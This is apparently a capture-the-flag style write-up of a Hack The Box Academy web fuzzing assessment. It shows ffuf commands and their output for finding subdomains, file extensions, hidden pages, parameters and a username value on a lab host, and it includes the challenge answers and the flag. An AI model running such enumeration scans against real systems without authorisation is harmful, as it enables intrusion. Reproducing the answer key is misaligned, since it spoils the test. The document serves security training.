# Skill Assessment - Web Fuzzing

## Challenge #1
Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name) 

### Solution #1
First I run the following command to do the sub-domain fuzzing:

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ  -u http://academy.htb:46515 -H 'Host: FUZZ.academy.htb'
```

I got a lot of `200 OK` and the common size is 985, so that I filter this out:

```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ  -u http://academy.htb:46515 -H 'Host: FUZZ.academy.htb' -fs 985
```

And the result is:

```sh
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 29ms]
test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 3453ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 32ms]
```

So, `archive, test, faculty` is the answer.

## Challenge #2
Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains? 

### Solution #2

I start the extension scanning, by supposing that we have an `index` file.

We also have to check for all the sub-domains, such as:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -u http://archive.academy.htb:46515/indexFUZZ
```

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -u http://test.academy.htb:46515/indexFUZZ
```

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions-big.txt:FUZZ -u http://faculty.academy.htb:46515/indexFUZZ
```

Also, you need to filter out common sizes, so you will have the correct ones.


And the result is: `(.php .phps .php7)`

## Challenge #3
One of the pages you will identify should say 'You don't have access!'. What is the full page URL? 

### Solution #3
Now, I will be fuzzing pages, as the extensions used now are known.

We know now also the sub-domains, so will be testing each sub-domain with each extension.

In the end, I found an interesting file on the `faculty` sub-domain, via this command:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://faculty.academy.htb:51963/FUZZ -recursion -recursion-depth 1 -e .php7
```

The interesint result, is a page, on the `/courses/` directory:

```sh
linux-security.php7     [Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 92ms]
```

Let's curl it:
```sh
curl http://faculty.academy.htb:51963/courses/linux-security.php7
```

And the result is:

```html
<div class='center'><p>You don't have access!</p></div>
```

## Challenge #4
In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they? 

### Solution #4

First I will try `GET` fuzzing:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://faculty.academy.htb:51963/courses/linux-security.php7?FUZZ"
```

This gave too many `200 OK`, and I filtered out the common size of 774:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u "http://faculty.academy.htb:51963/courses/linux-security.php7?FUZZ" -fs 774
```

And I got one parameter:

```sh
user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 59ms]
```

Let's try the second parameter, now by fuzzing the POST request:

```sh
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:51963/courses/linux-security.php7 -X POST -d 'FUZZ' -H'Content-Type: application/x-www-form-urlencoded' -fs 774
```

And now I got both of them:

```sh
user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 30ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 34ms]
```

## Final Challenge
Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag? 

### Final Solution

Now I should try some value fuzzing. And since the parameters are `user` and `username`, I should suppose that we are looking for some usernames as values.

For this I will use some provided wordlists from `seclists`.

```sh
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:51963/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'
```

From this I got three values:

```sh
harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 30ms]
Harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 31ms]
HARRY                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 34ms]
```

Now I `curl` to these id-s:

```sh
curl http://faculty.academy.htb:51963/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
```

And here there is the flag:

```html
<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
```

